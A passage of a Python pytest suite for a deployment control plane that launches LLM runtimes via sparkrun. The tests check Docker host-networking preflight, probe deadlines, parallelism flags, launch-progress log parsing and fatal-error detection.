    monkeypatch.setattr(module, "in_container", lambda: True)
    monkeypatch.setattr(module, "interfaces", lambda: ["eth0", "docker0"])
    monkeypatch.setattr(module.Path, "exists", lambda self: False)
    monkeypatch.setattr(module, "is_veth", lambda name: name == "eth0")
    assert module.check(stream=io.StringIO()) is True


def test_preflight_override_is_a_loud_warning_not_silence(monkeypatch):
    import io

    module = _preflight_module()
    monkeypatch.setattr(module, "in_container", lambda: True)
    monkeypatch.setattr(module, "interfaces", lambda: ["eth0"])
    monkeypatch.setattr(module, "is_veth", lambda name: True)
    monkeypatch.setattr(module.Path, "exists", lambda self: False)
    monkeypatch.setenv("DERATE_ALLOW_BRIDGE", "1")

    stream = io.StringIO()
    assert module.check(stream=stream) is True
    assert "WARNING" in stream.getvalue()
    assert "will not work" in stream.getvalue()


def _uncommented(text: str) -> str:
    return "\n".join(
        line for line in text.splitlines() if not line.lstrip().startswith("#")
    )


def test_dockerfile_ships_one_image_with_the_required_shape():
    dockerfile = (REPO / "Dockerfile").read_text()
    directives = _uncommented(dockerfile)
    # One image, one entrypoint. No coordinator/worker split, no second service.
    assert dockerfile.count("\nENTRYPOINT") == 1
    assert "--target" not in dockerfile
    # Health check on /agent/health, which exists in both roles.
    assert "/agent/health" in directives
    assert "/api/cluster" not in directives
    # Persisted state.
    assert 'VOLUME ["/data"]' in dockerfile
    # Every environment variable has a working default.
    for var in ("DERATE_ROLE", "DERATE_PORT", "DERATE_AGENT_PORT"):
        assert "%s=" % var in dockerfile
    assert "DERATE_TOKEN" in dockerfile
    assert "DERATE_JOIN" in dockerfile


def test_compose_uses_host_networking_and_restarts():
    compose = (REPO / "compose.yaml").read_text()
    settings = _uncommented(compose)
    assert "network_mode: host" in settings
    assert "restart: unless-stopped" in settings
    assert "/agent/health" in settings
    assert "/api/cluster" not in settings


def test_build_script_builds_both_architectures():
    """GB10 is arm64. Skipping it means the heterogeneous case does not work."""
    script = (REPO / "docker" / "build.sh").read_text()
    assert "linux/amd64,linux/arm64" in script
    assert "buildx" in script


@needs_docker
def test_image_refuses_bridge_networking():
    """The acceptance test for the trap: started on a bridge, the container
    exits with a message naming --network host."""
    if subprocess.run(
        ["docker", "image", "inspect", "derate/node:test"], capture_output=True
    ).returncode != 0:
        pytest.skip("build derate/node:test first: docker build -t derate/node:test .")

    proc = subprocess.run(
        ["docker", "run", "--rm", "--network", "bridge", "derate/node:test"],
        capture_output=True, text=True, timeout=120,
    )
    output = proc.stdout + proc.stderr
    assert proc.returncode != 0, output
    assert "--network host" in output
    assert "mDNS" in output


@needs_docker
def test_image_starts_on_host_networking_and_answers_agent_health():
    """docker run --network host, no configuration, working health endpoint."""
    if subprocess.run(
        ["docker", "image", "inspect", "derate/node:test"], capture_output=True
    ).returncode != 0:
        pytest.skip("build derate/node:test first: docker build -t derate/node:test .")

    name = "derate-acceptance-%d-%d" % (os.getpid(), int(time.time()))
    subprocess.run(["docker", "rm", "-f", name], capture_output=True, timeout=60)
    # Two distinct ports, so the two-port path is what gets exercised, and
    # free ones because host networking shares the host's ports -- a fixed
    # port would probe whatever else happens to be listening on it.
    ui_port, agent_port = _free_ports(2)
    started = subprocess.run(
        [
            # No --rm: the container's log is the evidence when this fails,
            # and --rm throws it away. Cleaned up in the finally below.
            # --restart is exercised through compose; it conflicts with --rm.
            "docker", "run", "-d", "--name", name,
            "--network", "host",
            "-e", "DERATE_PORT=%d" % ui_port,
            "-e", "DERATE_AGENT_PORT=%d" % agent_port,
            "derate/node:test",
        ],
        capture_output=True, text=True, timeout=120,
    )
    assert started.returncode == 0, started.stdout + started.stderr

    def logs() -> str:
        proc = subprocess.run(["docker", "logs", name], capture_output=True, text=True)
        return proc.stdout + proc.stderr

    def running() -> bool:
        proc = subprocess.run(
            ["docker", "inspect", "--format", "{{.State.Running}}", name],
            capture_output=True, text=True,
        )
        return proc.stdout.strip() == "true"

    try:
        # Our container, not something else that happens to answer. Without
        # this the probe below can pass against an unrelated listener while
        # our own container has already exited.
        assert wait_for(running, timeout=30.0), logs()

        import urllib.request

        from control_plane.deploy.health import probe as real_probe

        # /agent/health exists in both roles and lives on the agent port.
        agent_url = "http://127.0.0.1:%d" % agent_port
        assert wait_for(lambda: real_probe(agent_url, timeout=2.0)[0], timeout=60.0), logs()
        with urllib.request.urlopen("%s/agent/health" % agent_url, timeout=5) as response:
            assert json.load(response)["status"] == "ok"

        # The UI is served from the same origin as the API. No second service.
        with urllib.request.urlopen("http://127.0.0.1:%d/" % ui_port, timeout=5) as response:
            assert response.status == 200

        # Preflight confirmed host networking rather than skipping the check.
        assert "host networking confirmed" in logs()

        # /data is laid out and sparkrun's job metadata is inside the volume,
        # so a restarted container can still find what this node launched.
        listing = subprocess.run(
            ["docker", "exec", name, "sh", "-c", "ls /data; readlink /root/.cache/sparkrun"],
            capture_output=True, text=True, timeout=30,
        ).stdout
        assert "deployments" in listing and "recipes" in listing
        assert "/data/sparkrun-cache" in listing

        # A restarted container re-resolves its role.
        subprocess.run(["docker", "restart", name], capture_output=True, timeout=90)
        assert wait_for(lambda: real_probe(agent_url, timeout=2.0)[0], timeout=60.0), logs()
    finally:
        subprocess.run(["docker", "rm", "-f", name], capture_output=True, timeout=60)


@needs_docker
@pytest.mark.slow
def test_image_builds_for_both_architectures():
    """GB10 is arm64, the workstation is usually amd64. An image missing one
    means the heterogeneous case does not work at all.

    Slow: a cold buildx run is minutes. Deselect with -m 'not slow'.
    """
    if subprocess.run(
        ["docker", "buildx", "version"], capture_output=True
    ).returncode != 0:
        pytest.skip("docker buildx not available")

    # Through the shipped script, so this covers the builder it creates too:
    # the default docker driver cannot do multi-platform at all.
    proc = subprocess.run(
        ["bash", str(REPO / "docker" / "build.sh")],
        capture_output=True, text=True, timeout=3600,
        env={**os.environ, "SKIP_UI": "1", "TAG": "arch-test"},
        cwd=str(REPO),
    )
    output = proc.stdout + proc.stderr
    if proc.returncode != 0:
        if "exec format error" in output or "binfmt" in output.lower():
            pytest.skip(
                "no QEMU emulation on this host; run "
                "`docker run --privileged --rm tonistiigi/binfmt --install all`"
            )
        pytest.fail(output[-4000:])
    assert "linux/amd64" in output and "linux/arm64" in output


@needs_docker
def test_image_says_which_variable_moves_a_port_collision():
    """Host networking shares the host's ports. A collision must not be a
    traceback."""
    if subprocess.run(
        ["docker", "image", "inspect", "derate/node:test"], capture_output=True
    ).returncode != 0:
        pytest.skip("build derate/node:test first: docker build -t derate/node:test .")

    import socket as _socket

    holder = _socket.socket()
    holder.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
    holder.bind(("0.0.0.0", 0))
    holder.listen(1)
    taken = holder.getsockname()[1]
    # An unrelated listener on the UI port would make the container exit for
    # the wrong reason, so give it a free one.
    (ui_port,) = _free_ports(1)
    try:
        proc = subprocess.run(
            [
                "docker", "run", "--rm", "--network", "host",
                "-e", "DERATE_PORT=%d" % ui_port,
                "-e", "DERATE_AGENT_PORT=%d" % taken,
                "derate/node:test",
            ],
            capture_output=True, text=True, timeout=120,
        )
        output = proc.stdout + proc.stderr
        assert proc.returncode != 0
        assert "already in use" in output
        assert "DERATE_AGENT_PORT" in output
        assert "Traceback" not in output
    finally:
        holder.close()


# ---------------------------------------------------------------------------
# M-15 arbitration (orchestrator): the probe phase shares ONE absolute
# deadline, and past MAX_PROBE_WORKERS coverage rotates instead of truncating.
# ---------------------------------------------------------------------------


def _fake_probe_records(n):
    import types

    return [
        types.SimpleNamespace(
            deployment=types.SimpleNamespace(
                deployment_id="d-probe-%d" % i,
                backend_url="http://10.0.0.%d:8100/v1" % i,
                # The watch loop asks the port whether it is serving THIS name.
                served_name="probe-%d" % i,
            )
        )
        for i in range(n)
    ]


def test_concurrently_hanging_probes_share_one_absolute_deadline(tmp_path):
    """Eight probes that genuinely never return must cost ~one hard deadline,
    not eight: a serial per-thread join would accumulate k * deadline."""
    import time as _time

    def hanging_probe(backend_url, timeout=3.0, expect_model=None):
        _time.sleep(12)
        return True, None

    manager = make_manager(tmp_path, probe=hanging_probe)
    records = _fake_probe_records(8)
    started = _time.monotonic()
    results = manager._probe_backends(records, probe_timeout=0.5)
    elapsed = _time.monotonic() - started

    assert len(results) == 8
    for ok, detail in results.values():
        assert ok is False
        assert "did not return" in detail
    # hard deadline is probe_timeout * len(HEALTH_PATHS) = ~1s; a serial
    # join would take >= 8s. Generous margin for thread scheduling.
    assert elapsed < 4.0, "probe phase accumulated per-thread deadlines: %.2fs" % elapsed


def test_probe_rotation_covers_every_deployment_past_the_worker_cap(tmp_path, monkeypatch):
    """Past MAX_PROBE_WORKERS the window rotates: nothing is permanently
    unprobed, it is just probed every ceil(n/cap) ticks."""
    import control_plane.deploy.manager as manager_module

    probed = []

    def recording_probe(backend_url, timeout=3.0):
        probed.append(backend_url)
        return True, None

    monkeypatch.setattr(manager_module, "MAX_PROBE_WORKERS", 2)
    manager = make_manager(tmp_path, probe=recording_probe)
    records = _fake_probe_records(5)

    per_call = []
    for _ in range(3):
        results = manager._probe_backends(records, probe_timeout=1.0)
        per_call.append(set(results))

    assert all(len(ids) <= 2 for ids in per_call), "window exceeded the cap"
    covered = set().union(*per_call)
    assert covered == {r.deployment.deployment_id for r in records}, (
        "rotation must reach every deployment within ceil(n/cap) ticks"
    )


def test_bare_yaml_null_spellings_are_rejected_as_command_values():
    """'~', '.' and '..' pass no gate: '~' is YAML null and shell home."""
    from control_plane.deploy.recipes import _check_command_safe

    for bad in ("~", ".", ".."):
        with pytest.raises(ValueError):
            _check_command_safe(bad, "model_id")
    for good in (
        "meta-llama/Llama-3.3-70B-Instruct",
        "/data/models/x.gguf",
        "~/models/llama",
        "./relative/model-dir",
        "a",
    ):
        _check_command_safe(good, "model_id")


# ==========================================================================
# Acceptance: an operator-chosen placement reaches sparkrun as chosen.
#
# Verified against sparkrun 0.2.40 with --dry-run: `--tp`/`--pp` are passed
# through independently of `--hosts`, and a degree that does not fill the host
# list is launched as given without complaint. That is why the gateway refuses
# an under-filled selection itself -- nothing downstream will.
# ==========================================================================


def test_operator_ordered_hosts_reach_sparkrun_in_that_order(tmp_path):
    """The first node is the pipeline head. Sorting anywhere would move it."""
    adapter = FakeAdapter(
        FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "recipes"
    )
    plan = dataclasses.replace(
        fx.pp2_plan(), node_ids=[fx.SPARK_02.node_id, fx.SPARK_01.node_id]
    )
    argv = adapter.render_command(plan, fx.GPT_OSS_120B, "vllm", 65536, 512)

    assert argv[argv.index("--hosts") + 1] == "%s,%s" % (
        fx.SPARK_02.address,
        fx.SPARK_01.address,
    )


def test_manual_degrees_reach_both_the_recipe_and_the_command_line(tmp_path):
    """Keeps manual degrees from quietly becoming a lie.

    Three hops carry them -- the sparkrun CLI flags, the recipe `defaults:`,
    and the runtime command template -- and a manual degree is only honest if
    all three agree. If `flags.py` is ever edited, this is what notices.
    """
    adapter = FakeAdapter(
        FakeRegistry(fx.SPARK_01, fx.SPARK_02), recipe_dir=tmp_path / "recipes"
    )
    plan = dataclasses.replace(
        fx.pp2_plan(),
        kind=ParallelismKind.TENSOR,
        tensor_parallel=2,
        pipeline_parallel=1,
    )
    argv = adapter.render_command(plan, fx.GPT_OSS_120B, "vllm", 65536, 512)

    assert argv[argv.index("--tp") + 1] == "2"
    assert argv[argv.index("--pp") + 1] == "1"

    # `render_command` is pure and writes nothing, so the recipe is
    # synthesized here rather than read back off disk.
    recipe = recipes.synthesize(
        fx.GPT_OSS_120B,
        plan,
        "vllm",
        65536,
        512,
        "gpt-oss-120b",
        port=8100,
        gpu_memory_utilization=0.90,
        recipe_dir=tmp_path / "recipes",
    ).content
    assert "tensor_parallel: 2" in recipe
    assert "pipeline_parallel: 1" in recipe
    # The template has to actually interpolate them, or the flags above are
    # accepted and silently do nothing.
    assert "--tensor-parallel-size {tensor_parallel}" in recipe
    assert "--pipeline-parallel-size {pipeline_parallel}" in recipe


# ==========================================================================
# What a launch is doing while it is doing it.
#
# A deployment sits in LAUNCHING from the invocation until the backend
# answers, which on a first launch is twenty minutes of one unchanging word
# covering four different slow things. These are the rules that make it four.
# ==========================================================================


def test_the_launcher_and_the_runtime_are_read_for_their_own_phases():
    """Both halves of the window, from the strings each program really prints.

    sparkrun's are from its installed package, vLLM's from the image this
    project launches. If either changes wording, this is what notices --
    which is the whole reason the markers are literals and not a heuristic.
    """
    from control_plane.deploy import progress

    pulling = progress.from_launcher(
        "Pulling image: ghcr.io/spark-arena/dgx-vllm-eugr-nightly:latest..."
    )
    assert pulling.phase == "preparing"
    # Verbatim. The image reference is the part somebody needs to see.
    assert pulling.status.startswith("Pulling image: ghcr.io/")
    assert pulling.source == "sparkrun"

    assert progress.from_launcher(
        "Ensuring model Qwen/Qwen3-4B-AWQ is available locally..."
    ).phase == "downloading"

    assert progress.from_runtime_log(
        "INFO [gpu_model_runner.py:2589] Starting to load model Qwen/Qwen3-4B-AWQ..."
    ).phase == "loading"
    # Announces that loading finished, so it belongs to what comes next.
    assert progress.from_runtime_log("Loading weights took 12.34 seconds").phase == "starting"
    assert progress.from_runtime_log(
        "INFO Capturing CUDA graphs (mixed prefill-decode, PIECEWISE)"
    ).phase == "starting"

    # The two things that must NOT happen: a line nobody recognises does not
    # become a phase, and does not become a caption either.
    assert progress.from_runtime_log("WARNING: some unrelated tokenizer notice") is None
    assert progress.from_launcher("") is None


def test_a_real_launch_walks_the_ladder_in_order():
    """The step headers a real `sparkrun run` prints, in the order it prints them.

    Copied off `sparkrun run <recipe> --hosts ... --dry-run --no-follow` on a
    non-tty, which is how the manager sees it. This is here because the
    headers a person actually sees and the format strings inside sparkrun's
    package are two different sets of words -- the first version of this
    matched only the second, and would have reported `preparing` through a
    whole launch.
    """
    from control_plane.deploy import progress

    printed = [
        "[1/6] Preparing",
        "[2/6] Building image",
        "[3/6] Distributing resources",
        "  Ensuring model openai/gpt-oss-120b is available locally...",
        "[4/6] Syncing tuning configs",
        "[5/6] Launching vllm runtime",
        "  Step 1/3: Detecting InfiniBand",
        "  Step 2/3: Launching container",
        "  Step 3/3: Executing serve command",
    ]
    held = None
    walked = []
    for line in printed:
        held = progress.advance(held, progress.from_launcher(line))
        walked.append(held.phase)

    assert walked[0] == "preparing"
    assert walked[3] == "downloading"
    assert walked[-1] == "loading"
    # Never backwards, whatever order the headers arrive in. "[4/6] Syncing
    # tuning configs" lands after the weights and would otherwise walk the
    # ladder back to `preparing`.
    ranks = [progress.rank(p) for p in walked]
    assert ranks == sorted(ranks)


def test_only_the_shard_loader_reports_a_fraction():
    """The one measurement in a launch, and the newest frame of it.

    The shard bar is tqdm: its frames arrive `\\r`-separated inside one line,
    so reading the line naively reports the FIRST frame -- a launch whose bar
    is stuck at 0% for the whole load.
    """
    from control_plane.deploy import progress

    frames = (
        "Loading safetensors checkpoint shards:   0% Completed | 0/3 [00:00<?, ?it/s]\r"
        "Loading safetensors checkpoint shards:  33% Completed | 1/3 [00:01<00:02,  1.2s/it]\r"
        "Loading safetensors checkpoint shards:  67% Completed | 2/3 [00:02<00:01,  1.1s/it]"
    )
    reading = progress.from_runtime_log(frames)
    assert reading.phase == "loading"
    assert reading.fraction == pytest.approx(2 / 3)

    # Every other phase measures nothing, and nothing here invents one for it.
    assert progress.from_launcher("Pulling image: x:latest...").fraction is None
    assert progress.from_runtime_log("Capturing CUDA graphs").fraction is None
    assert progress.from_runtime_log(
        "Loading safetensors checkpoint shards: 0/0"
    ).fraction is None


def test_the_only_estimates_are_the_ones_the_work_made_about_itself():
    """Where "3 minutes left" is allowed to come from.

    Two of a launch's four steps count themselves with a tqdm bar -- the model
    downloader (`Fetching 16 files`, from huggingface_hub, which sparkrun
    enables and which reaches us only because the launch output is streamed)
    and the checkpoint loader. tqdm prints its own remaining time in every
    frame. The other two steps report no total at all and get no estimate,
    because one extrapolated here is a number people plan around.
    """
    from control_plane.deploy import progress

    fetching = progress.from_launcher(
        "Fetching 16 files:  19%|#########  | 3/16 [00:45<03:15, 15.0s/it]"
    )
    assert fetching.phase == "downloading"
    assert fetching.fraction == pytest.approx(0.19)
    assert fetching.eta_s == pytest.approx(195.0)

    shards = progress.from_runtime_log(
        "Loading safetensors checkpoint shards:  45% Completed | 5/11 [00:12<00:14,  1.2s/it]"
    )
    assert shards.eta_s == pytest.approx(14.0)
    assert progress.from_launcher(
        "Fetching 4 files:  50%|#####| 2/4 [1:02:11<1:02:11, 3731s/it]"
    ).eta_s == pytest.approx(3731.0)

    # A bar with nothing to go on yet prints `?`. No estimate is not an
    # estimate of zero.
    early = progress.from_launcher("Fetching 16 files:   0%|  | 0/16 [00:00<?, ?it/s]")
    assert early.eta_s is None
    assert early.fraction == 0.0

    # One file's percentage is not the download's. Taking whichever bar frame
    # arrived last would swing the figure between two different questions.
    assert progress.from_launcher(
        "model-00001-of-00016.safetensors:  34%|###| 1.35G/3.95G [00:12<00:23, 112MB/s]"
    ) is None

    # And the steps that count nothing say nothing.
    assert progress.from_launcher("Pulling image: ghcr.io/x:latest...").eta_s is None
    assert progress.from_runtime_log("Capturing CUDA graphs").eta_s is None


def test_the_launch_log_is_kept_as_it_arrives_and_bar_frames_do_not_fill_it(tmp_path):
    """The lines behind the sheet's log view, and why they are free.

    They are the same lines the phase classifier is already handed, so keeping
    them costs nothing -- and asking for them again would cost plenty, because
    `sparkrun logs` follows and cannot be polled. A download redraws its bar
    several times a second, so frames of one bar collapse onto each other:
    without that, a 500-line buffer is a progress bar and nothing else.
    """
    probe = FakeProbe(healthy_by_default=False)
    manager = make_manager(tmp_path, probe=probe)
    manager.adapter.launch_output = [
        "[2/6] Building image",
        "Fetching 16 files:   6%|#  | 1/16 [00:05<01:15, 5.0s/it]",
        "Fetching 16 files:  12%|##  | 2/16 [00:10<01:10, 5.0s/it]",
        "Fetching 16 files:  19%|### | 3/16 [00:15<01:05, 5.0s/it]",
    ]
    manager.adapter.log_tail = "INFO Starting to load model Qwen/Qwen3-30B..."
    dep = manager.launch(
        fx.QWEN3_30B_A3B, fx.single_node_plan(), fx.fits(), "vllm", 8192, 64
    )

    assert wait_for(
        lambda: any(
            "Starting to load model" in line
            for line in manager.log_tail(dep.deployment_id)["lines"]
        )
    )
    answer = manager.log_tail(dep.deployment_id)
    lines = answer["lines"]
    # From memory, which is what makes it safe for a screen to poll.
    assert answer["source"] == "buffer"
    # Both halves of the launch, in the order they happened: the launcher's
    # output and then the container's, which is one story to a reader.
    assert lines[0] == "[2/6] Building image"
    assert lines[-1].endswith("Starting to load model Qwen/Qwen3-30B...")
    # One bar, at its newest frame -- not three.
    frames = [line for line in lines if line.startswith("Fetching 16 files")]
    assert len(frames) == 1
    assert frames[0].lstrip().startswith("Fetching 16 files:  19%")
    manager.close()


def test_a_phase_never_walks_backwards():
    """A log tail is a window, not a stream.

    A slow poll can land after the interesting lines scrolled out of it and
    come back with an older marker. Left alone that un-ticks a step, which
    reads as something going wrong.
    """
    from control_plane.deploy import progress

    loading = progress.LaunchProgress("loading", "1/3", fraction=1 / 3)
    starting = progress.LaunchProgress("starting", "Capturing CUDA graphs")

    assert progress.advance(loading, starting) is starting
    assert progress.advance(starting, loading) is starting
    # Within a phase the newest sentence wins: "2/3" must replace "1/3".
    later = progress.LaunchProgress("loading", "2/3", fraction=2 / 3)
    assert progress.advance(loading, later) is later
    # Nothing read leaves what we had alone.
    assert progress.advance(loading, None) is loading


def test_the_manager_reports_the_phase_while_it_launches_and_stops_after(tmp_path):
    """End to end: sparkrun's output, then the container log, then silence.

    The manager streams the launch output as it arrives -- the pull and the
    weights happen inside that one call -- and reads the backend's log while
    it waits for readiness. Once the deployment is serving there is no phase
    to report, because a state describes it better than a stale sentence.
    """
    probe = FakeProbe(healthy_by_default=False)
    manager = make_manager(tmp_path, probe=probe)
    manager.adapter.log_tail = (
        "INFO Starting to load model Qwen/Qwen2.5-0.5B-Instruct...\n"
        "Loading safetensors checkpoint shards:  50% Completed | 1/2 [00:01<00:01]"
    )
    dep = manager.launch(
        fx.QWEN3_30B_A3B, fx.single_node_plan(), fx.fits(), "vllm", 8192, 64
    )

    # Wait for the runtime to be the one talking. Before the first log read
    # lands the phase is already `loading` -- the container is up, which is
    # something we know without being told -- so waiting on the phase alone
    # would race the read this test is about.
    assert wait_for(
        lambda: manager.progress().get(dep.deployment_id, {}).get("source") == "runtime"
    )
    reported = manager.progress()[dep.deployment_id]
    assert reported["phase"] == "loading"
    # The runtime's own sentence and the runtime's own count, unedited.
    assert reported["status"].startswith("Loading safetensors checkpoint shards:")
    assert reported["fraction"] == pytest.approx(0.5)

    probe.healthy_by_default = True
    assert wait_for(lambda: manager.get(dep.deployment_id).state is S.READY)
    assert dep.deployment_id not in manager.progress()
    # And the follower is shut down with it. `sparkrun logs` is a `tail -f`
    # inside the container; one left running holds an exec session open on the
    # node for as long as the model is served.
    assert manager.adapter.streams, "the launch is expected to have followed a log"
    assert wait_for(lambda: all(s.closed for s in manager.adapter.streams))
    manager.close()


def test_a_runtime_that_dies_inside_a_live_container_fails_the_launch_now():
    """The thirty-minute failure this box actually produces.

    A solo launch execs the serve command inside a container that sleeps
    forever. When the engine exits, the container stays up: `check-job` says
    the workload is running, the port refuses, and the ready wait spends the
    whole of READY_TIMEOUT_S on a process that has already gone. The record
    left behind said "backend did not answer within 1800s: connection
    refused"; the log said the engine refused to start because 49.56 of 121.69
    GiB were free against a 0.9 utilization target, thirty seconds in.
    """
    from control_plane.deploy import progress

    died = progress.from_runtime_log(
        "(EngineCore pid=350) ERROR 09-07 21:38:43 [core.py:1385] EngineCore "
        "failed to start."
    )
    assert died.fatal is True
    assert died.status.endswith("EngineCore failed to start.")

    # A death is not a step, so it is not read newest-first with the progress
    # markers and it is not held back by the ladder either. A shard count
    # printed after the traceback does not undo the traceback.
    after = progress.from_runtime_log(
        "RuntimeError: Engine core initialization failed. See root cause above.\n"
        "Loading safetensors checkpoint shards:  50% Completed | 1/2"
    )
    assert after.fatal is True
    loading = progress.LaunchProgress("loading", "1/2", fraction=0.5)
    assert progress.advance(loading, died) is died

    # And nothing merely alarming is fatal. The bar is "this line means the
    # process is on its way out", not "this line contains the word error".
    for line in (
        "ERROR 09-07 21:38:43 [core.py:1385] Traceback (most recent call last):",
        "WARNING: Unknown vLLM environment variable detected: VLLM_BASE_DIR",
        "(APIServer pid=93) ERROR ... raise ValueError(",
    ):
        reading = progress.from_runtime_log(line)
        assert reading is None or not reading.fatal, line


def test_the_tts_server_announces_its_own_death_and_the_marker_is_one_string():
    """The same thirty-minute failure, in the runtime this repository writes.

    `runtimes/tts.py` does its whole parse-load-build before `uvicorn.run`, so
    a checkpoint that does not answer the three calls, a config with no codec,
    or a `--tp 2` the server refuses all exit with no port ever bound -- and
    none of the vLLM markers above are printed by a process that is not vLLM.
    The container goes on sleeping either way.

    The marker is spelled twice on purpose: `progress.py` may not import
    `runtimes.tts` (torch and transformers are its dependencies and it runs
    inside a model container), so the copy is checked here instead of trusted.
    """
    from control_plane.deploy import progress
    from control_plane.runtimes import tts

    assert tts.FATAL_MARKER in progress._RUNTIME_FATAL

    died = progress.from_runtime_log(
        "2026-09-07 21:38:43,001 ERROR derate.tts "
        + tts.FATAL_MARKER
        + "\nTraceback (most recent call last):"
    )
    assert died.fatal is True
    assert tts.FATAL_MARKER in died.status

    # The refusal this server makes on purpose reaches the same place: a
    # single-process runtime handed TP=2 exits with a sentence, and without
    # the marker that sentence sat in a log nobody read for 1800 seconds.
    refused = progress.from_runtime_log(
        "2026-09-07 21:38:43,001 ERROR derate.tts %s --tensor-parallel-size 2: "
        "this runtime runs one process on one GPU and cannot shard a "
        "checkpoint." % tts.FATAL_MARKER
    )
    assert refused.fatal is True

    # An ordinary line from the same server is not a death. `Uvicorn running
    # on` is the opposite of one, and it is already a `starting` marker.
    alive = progress.from_runtime_log(
        "2026-09-07 21:38:43,001 INFO derate.tts loaded ArkttsModel on cuda:0"
    )
    assert alive is None or not alive.fatal


def test_the_tts_server_prints_the_marker_before_it_gives_up(caplog, monkeypatch):
    """Printed by `main`, not merely defined beside it.

    The constant existing is worth nothing if the failure path does not reach
    it, and the failure path is an except block around three calls -- exactly
    the kind of thing that survives a refactor by being deleted.
    """
    import logging

    from control_plane.runtimes import tts

    def _explode(self):
        raise RuntimeError("a model without a codec is not one")

    monkeypatch.setattr(tts.SpeechEngine, "load", _explode)

    argv = ["--model", "Audio8/Audio8-TTS-Preview-0.6b", "--trust-remote-code"]
    with caplog.at_level(logging.ERROR, logger="derate.tts"):
        with pytest.raises(RuntimeError):
            tts.main(argv)
    assert any(tts.FATAL_MARKER in r.getMessage() for r in caplog.records)

    # And the argv refusal, which leaves by SystemExit rather than by raising.
    caplog.clear()
    with caplog.at_level(logging.ERROR, logger="derate.tts"):
        with pytest.raises(SystemExit):
            tts.main(argv + ["--tensor-parallel-size", "2"])
    assert any(tts.FATAL_MARKER in r.getMessage() for r in caplog.records)


def test_a_config_error_before_enginecore_forks_is_also_fatal():
    """The failure that slipped past all three EngineCore markers.

    A launch whose `max_model_len` was set past the model's own
    `max_position_embeddings` never gets as far as EngineCore: pydantic
    rejects the config inside `create_engine_config`, in the API server
    process, and the traceback unwinds straight back to the CLI entrypoint's
    own `sys.exit(main())` frame. None of the three EngineCore-specific
    literals appear anywhere in it, so before this marker existed the launch
    would have watched a container that was never going to answer for the
    full readiness timeout, same as the case above.
    """
    from control_plane.deploy import progress

    died = progress.from_runtime_log(
        "(APIServer pid=93) Traceback (most recent call last):\n"
        '(APIServer pid=93)   File "/usr/local/bin/vllm", line 10, in <module>\n'
        "(APIServer pid=93)     sys.exit(main())\n"
        "(APIServer pid=93) pydantic_core._pydantic_core.ValidationError: 1 "
        "validation error for ModelConfig\n"
        "(APIServer pid=93)   Value error, User-specified max_model_len "
        "(780800) is greater than the derived max_model_len "
        "(max_position_embeddings=40960.0 or model_max_length=None in "
        "model's config.json)."
    )
    assert died.fatal is True


def test_the_manager_stops_waiting_when_the_runtime_says_it_died(tmp_path):
    """End to end, against a container that is still up.

    `is_running` stays True the whole time -- that is the point -- so before
    the manager read the log this launch had nothing to fail on until the
    ready timeout expired half an hour later.
    """
    probe = FakeProbe(healthy_by_default=False)
    manager = make_manager(tmp_path, probe=probe, ready_timeout_s=600.0)
    manager.adapter.log_tail = (
        "(EngineCore pid=350) INFO Starting to load model Qwen/Qwen3-30B...\n"
        "(EngineCore pid=350) ERROR ValueError: Free memory on device cuda:0 "
        "(49.56/121.69 GiB) on startup is less than desired GPU memory "
        "utilization (0.9, 109.52 GiB).\n"
        "(EngineCore pid=350) ERROR EngineCore failed to start."
    )
    dep = manager.launch(
        fx.QWEN3_30B_A3B, fx.single_node_plan(), fx.fits(), "vllm", 8192, 64
    )

    # Seconds, against a 600s readiness budget that is still running.
    assert wait_for(lambda: manager.get(dep.deployment_id).state is S.FAILED, timeout=10.0)
    assert manager.adapter.is_running(manager.handles()[dep.deployment_id]["cluster_id"])

    # The runtime's own sentence, not "backend did not answer within 600s".
    failure = manager.get(dep.deployment_id).last_error
    assert "EngineCore failed to start." in failure
    # And the memory refusal underneath it reached the calibration event,
    # which is the whole reason a fit miss is worth catching.
    assert drain(manager.bus, ev.FIT_MISS), "a startup memory refusal is a fit miss"
    manager.close()


def test_the_startup_memory_refusal_is_recognised_as_a_fit_miss():
    """The most valuable telemetry this system produces, previously discarded.

    vLLM refusing to start because the pool is smaller than the utilization
    target never says "out of memory", so it was tagged an ordinary failure --
    and Agent D learned nothing from the one case its estimate is calibrated
    by. On GB10 this is the expected shape of a miss: the static ceiling says
    the model fits and the OS is sharing the same pool.
    """
    from control_plane.deploy.sparkrun import is_oom

    assert is_oom(
        "ValueError: Free memory on device cuda:0 (49.56/121.69 GiB) on startup "
        "is less than desired GPU memory utilization (0.9, 109.52 GiB). Decrease "
        "GPU memory utilization or reduce GPU memory used by other processes."
    )
    # Still not a catch-all for anything mentioning memory.
    assert not is_oom("INFO Available KV cache memory: 12.34 GiB")


def test_the_compile_cache_is_pointed_somewhere_that_survives_the_container(tmp_path):
    """The reason a second launch of the same model is not a second cold start.

    sparkrun runs the container with `HOME=/tmp` and `--rm`, and the host's
    HuggingFace cache is the only writable mount it has. Left alone, vLLM
    resolves VLLM_CACHE_ROOT under that HOME and every launch recompiles from
    cold -- minutes, after the download is over, with nothing on screen
    saying why.
    """
    from control_plane.deploy.flags import RUNTIME_CACHE_DIR, runtime_spec

    recipe = recipes.synthesize(
        fx.GPT_OSS_120B,
        fx.pp2_plan(),
        "vllm",
        32768,
        256,
        "gpt-oss-120b",
        port=8100,
        gpu_memory_utilization=0.90,
        recipe_dir=tmp_path / "recipes",
    ).content

    assert "env:\n" in recipe
    assert "VLLM_CACHE_ROOT: %s/vllm" % RUNTIME_CACHE_DIR in recipe
    # Inside the one mount that outlives the container, and beside `hub/`
    # rather than in it: modelcache.py measures and deletes `hub/models--*`,
    # and compiled kernels are not weights.
    assert RUNTIME_CACHE_DIR.startswith("/cache/huggingface/")
    assert not RUNTIME_CACHE_DIR.startswith("/cache/huggingface/hub")

    # The tts runtime compiles nothing, so it carries no compile-cache
    # variable -- an unread one pointed at a directory suggests a saving that
    # is not there. What it does carry is the voice library, which is the same
    # mechanism used in the other direction: `env:` is the only channel into a
    # launched container (the recipe format has no `volumes:` key), so a
    # directory that must outlive one launch is pointed at RUNTIME_CACHE_DIR
    # whether the runtime writes it or only reads it. The image's own default,
    # /voices, is a path nothing mounts.
    tts_env = dict(runtime_spec("tts").cache_env)
    assert tts_env == {"DERATE_TTS_VOICE_DIR": RUNTIME_CACHE_DIR + "/voices"}
    assert not any("CACHE_ROOT" in name for name in tts_env)
    tts = recipes.synthesize(
        fx.AUDIO8_TTS_0_6B,
        fx.single_node_plan(),
